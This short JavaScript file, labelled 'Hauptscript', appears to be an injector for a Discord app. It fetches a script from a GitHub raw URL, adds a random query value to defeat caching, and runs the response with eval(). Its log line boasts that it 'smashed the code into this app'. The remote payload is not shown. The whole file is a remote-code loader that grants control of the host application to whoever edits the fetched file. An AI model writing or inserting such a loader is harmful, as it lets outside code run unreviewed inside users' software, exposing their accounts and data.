
/*
Hauptscript
*/


var xmlhttp;
if (window.XMLHttpRequest){
  xmlhttp = new XMLHttpRequest();
  xmlhttp.open("GET", "https://raw.githubusercontent.com/4thebadwoofsky/scripts.common/master/discord.io.api.js?"+ Math.random()*20000  ,false);
  xmlhttp.onreadystatechange = function () {
    if (xmlhttp.readyState != 4) return;
    eval(xmlhttp.responseText);
    console.log("[InjectorJS] Discord Crypto Fuck smashed the code into this app");
  };
  xmlhttp.send(null);
}

